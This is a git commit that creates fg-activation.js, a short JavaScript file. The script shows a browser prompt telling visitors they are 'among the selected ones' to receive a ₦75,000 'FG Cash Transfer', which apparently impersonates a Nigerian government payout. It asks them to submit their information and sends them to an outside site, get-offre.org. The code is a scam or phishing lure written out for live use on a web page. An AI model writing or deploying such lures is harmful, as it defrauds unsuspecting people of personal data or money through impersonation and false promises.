838a1c97e738b6b062540198acfdf033f1c4b0ec
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-06-22 01:34:32 -0700

    Create fg-activation.js

---
+++ fg-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('FG: Congratulations, you are among the selected ones to receive the ₦75,000 FG Cash Transfer, kindly press 1 to submit your information now ','1');
+if (password != '1') {
+location.href='https://get-offre.org/fg.cash.transfer.html';
+}
